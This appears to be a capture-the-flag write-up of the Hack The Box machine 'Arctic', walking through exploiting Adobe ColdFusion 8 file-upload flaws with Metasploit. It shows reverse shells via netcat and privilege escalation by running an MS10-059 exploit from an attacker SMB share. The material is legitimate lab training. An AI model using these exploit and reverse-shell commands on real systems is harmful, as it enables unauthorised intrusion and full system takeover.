### Arctic HTB

### Difficulty: Easy

### IP Address = 10.10.10.11

Nmap Scan:

```
──(mark㉿haxor)-[~/Desktop/B2B/HTB/Arctic]
└─$ nmap -sCV -A 10.10.10.11 -p135,8500 -oN nmapscan -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-20 05:07 WAT
Nmap scan report for 10.10.10.11
Host is up (0.31s latency).

PORT     STATE SERVICE VERSION
135/tcp  open  msrpc   Microsoft Windows RPC
8500/tcp open  fmtp?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 165.17 seconds

```

On heading to the service on port 8500 we see its a web server and that its indexed 

Meaning we can list and navigate through files (directory listing)
![image](https://user-images.githubusercontent.com/113513376/213615555-41e799c1-6159-4afe-b1a9-04ad2a7383ef.png)


After poking around i got this url `http://10.10.10.11:8500/CFIDE/administrator/` 

Which when navigated to shows a login page
![image](https://user-images.githubusercontent.com/113513376/213615935-f3fa8b85-7df9-4595-9481-9d52274f5c76.png)

And from the image we see its version also in the logo `Adobe ColdFusion 8`

Now lets fire metasploit and search for possible exploits

```                                                                                                    
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Arctic]
└─$ msfconsole
                                                  
                          ########                  #
                      #################            #
                   ######################         #
                  #########################      #
                ############################
               ##############################
               ###############################
              ###############################
              ##############################
                              #    ########   #
                 ##        ###        ####   ##
                                      ###   ###
                                    ####   ###
               ####          ##########   ####
               #######################   ####
                 ####################   ####
                  ##################  ####
                    ############      ##
                       ########        ###
                      #########        #####
                    ############      ######
                   ########      #########
                     #####       ########
                       ###       #########
                      ######    ############
                     #######################
                     #   #   ###  #   #   ##
                     ########################
                      ##     ##   ##     ##
                            https://metasploit.com


       =[ metasploit v6.2.9-dev                           ]
+ -- --=[ 2229 exploits - 1177 auxiliary - 398 post       ]
+ -- --=[ 867 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: To save all commands executed since start up 
to a file, use the makerc command

[*] Starting persistent handler(s)...
msf6 > 
```

Then search `coldfusion 8 `

```
msf6 > search coldfusion 8

Matching Modules
================

   #  Name                                                Disclosure Date  Rank       Check  Description
   -  ----                                                ---------------  ----       -----  -----------
   0  exploit/multi/http/coldfusion_ckeditor_file_upload  2018-09-11       excellent  No     Adobe ColdFusion CKEditor unrestricted file upload
   1  auxiliary/scanner/http/adobe_xml_inject                              normal     No     Adobe XML External Entity Injection
   2  exploit/windows/http/coldfusion_fckeditor           2009-07-03       excellent  No     ColdFusion 8.0.1 Arbitrary File Upload and Execute
   3  auxiliary/scanner/http/coldfusion_locale_traversal                   normal     No     ColdFusion Server Check
   4  auxiliary/gather/jetty_web_inf_disclosure           2021-07-15       normal     Yes    Jetty WEB-INF File Disclosure


Interact with a module by name or index. For example info 4, use 4 or use auxiliary/gather/jetty_web_inf_disclosure
```

Checking out the exploit

```
msf6 exploit(multi/http/coldfusion_ckeditor_file_upload) > use 0
[*] Using configured payload java/jsp_shell_reverse_tcp
msf6 exploit(multi/http/coldfusion_ckeditor_file_upload) > set rhosts 10.10.10.11
rhosts => 10.10.10.11
msf6 exploit(multi/http/coldfusion_ckeditor_file_upload) > set lhost tun0
lhost => tun0
msf6 exploit(multi/http/coldfusion_ckeditor_file_upload) > run

[*] Started reverse TCP handler on 10.10.16.7:4444 
[*] Uploading the JSP payload at /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/uploadedFiles/IYTSIKNIN.jsp...
[-] Exploit aborted due to failure: unknown: Upload Failed...
[*] Exploit completed, but no session was created.
```

Ok it failed but why?

Its cause the path its trying to upload our payload doesn't exist

But since we have directory listing we can find the right path

After playing around for some minutes i found this path `/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/cf_upload.cfm` 

So instead of the exploit to attempt to upload the file in `/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/uploadedFiles/` 

I can rather make it upload in the path i want

To do this i need to intercept the request in burp

So in the exploit i'll add this 

```
msf6 exploit(multi/http/coldfusion_ckeditor_file_upload) > set proxies http:127.0.0.1:8080
proxies => http:127.0.0.1:8080
```

Now i'll try to re-run the exploit and intercept it in burp 
![image](https://user-images.githubusercontent.com/113513376/213618734-020e0c36-a378-4852-b1db-18c61553705e.png)

So I will just change the path to the right one which is `/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/cf_upload.cfm` 
![image](https://user-images.githubusercontent.com/113513376/213618807-a9c6d0f8-c06a-4961-8a97-e3588e09f0b8.png)

But still it fails 

```
msf6 exploit(multi/http/coldfusion_ckeditor_file_upload) > run

[*] Started reverse TCP handler on 10.10.16.7:4444 
[*] Uploading the JSP payload at /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/uploadedFiles/QFSQVIZRMX.jsp...
[-] Exploit aborted due to failure: unknown: Upload Failed...
[*] Exploit completed, but no session was created.
```

Now i checked the request it made in burp suite proxy history

And tried it again and it uploaded
![image](https://user-images.githubusercontent.com/113513376/213619722-86fe1441-b321-49ff-966b-9707507528c5.png)

But another problem 

It doesn't really upload it needs another http form of request (GET) to work which i can't chain using burp

So i went back to msf and try other exploit

```
msf6 exploit(windows/http/coldfusion_fckeditor) > use exploit/windows/http/coldfusion_fckeditor
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(windows/http/coldfusion_fckeditor) > set rport 8500
rport => 8500
msf6 exploit(windows/http/coldfusion_fckeditor) > set rhosts 10.10.10.11
rhosts => 10.10.10.11
msf6 exploit(windows/http/coldfusion_fckeditor) > set proxies http:127.0.0.1:8080
proxies => http:127.0.0.1:8080
msf6 exploit(windows/http/coldfusion_fckeditor) > set lhost tun0
lhost => tun0
msf6 exploit(windows/http/coldfusion_fckeditor) > 
```

On running it 

```
msf6 exploit(windows/http/coldfusion_fckeditor) > run

[*] Started reverse TCP handler on 10.10.16.7:4444 
[*] Sending our POST request...
[-] Upload Failed...
[*] Exploit completed, but no session was created.
msf6 exploit(windows/http/coldfusion_fckeditor) > 

```

Failed again 

The request made 
![image](https://user-images.githubusercontent.com/113513376/213620781-0fa8eebf-801e-48a6-9f41-037911b08adf.png)

So it seems like this is the right exploit to use cause it is chaining the required request method and also sending it to the right path of the upload.crm

So guess its time to debug lol

So i'll change the payload type to `java/jsp_shell_reverse_tcp` and intercept the request in burp 

```
msf6 exploit(windows/http/coldfusion_fckeditor) > set payload java/jsp_shell_reverse_tcp
payload => java/jsp_shell_reverse_tcp
msf6 exploit(windows/http/coldfusion_fckeditor) > run
```

![image](https://user-images.githubusercontent.com/113513376/213787726-ec79b5aa-4a68-4223-ba46-b2fdcbbb9cfe.png)

It shows failed again 

```
msf6 exploit(windows/http/coldfusion_fckeditor) > run

[*] Started reverse TCP handler on 10.10.16.7:4444 
[*] Sending our POST request...
[-] Upload Failed...
[*] Exploit completed, but no session was created.
msf6 exploit(windows/http/coldfusion_fckeditor) > 
```

But checking the burp proxy request history shows that it works and the file uploaded 
![image](https://user-images.githubusercontent.com/113513376/213788206-53dc2a75-e440-421f-998d-342638c1d394.png)

Well thats weird 


Lets confirm if it really uploaded by navigating to the directory it uploaded in


And yea it did upload
![image](https://user-images.githubusercontent.com/113513376/213788384-f0dfdad3-3feb-49e3-bee6-3a7d52be40f5.png)


Maybe it showed failed cause it tried to execute the payload but there wasn't any listener 🤔


Anyways I'll set a nc listener and click any of the upload .jsp file

And we got a connection back on our listner 

```                                                                                                          
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Arctic]
└─$ nc -lvnp 4444  
listening on [any] 4444 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.10.11] 52862
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>
```

Now lets escalate privilege

But before that i'll get a shell via msf by creating a binary which when run will give a reverse shell back on the listener
![image](https://user-images.githubusercontent.com/113513376/213790609-769f931c-2e5a-47e4-96f1-bb4279321dda.png)


Checking the version for the target OS

```
meterpreter > sysinfo
Computer        : ARCTIC
OS              : Windows 2008 R2 (6.1 Build 7600).
Architecture    : x64
System Language : el_GR
Domain          : HTB
Logged On Users : 3
Meterpreter     : x86/windows
meterpreter > 
```

Checking for exploit on the OS version leads me here
![image](https://user-images.githubusercontent.com/113513376/213795400-f6ead436-f045-4abf-aa5d-eb39daefa184.png)


Trying out the exploit on the target

![image](https://user-images.githubusercontent.com/113513376/213796167-b62b2619-bef2-4479-b9f1-6d297b205027.png)

```
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Arctic]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.10.11] 53064
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\tolis\Desktop>net use \\10.10.16.7\share /USER:admin admin 

C:\Users\tolis\Desktop>\\10.10.16.7\share\MS10.059.exe 10.10.16.7 1337

```

Now on the listener 

```
──(mark㉿haxor)-[~/Desktop/B2B/HTB/Arctic]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.10.11] 53067
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\tolis\Desktop>whoami
whoami
nt authority\system

C:\Users\tolis\Desktop>
```

And we're done xD

<br> <br>
[Back To Home](../../index.md)
<br>




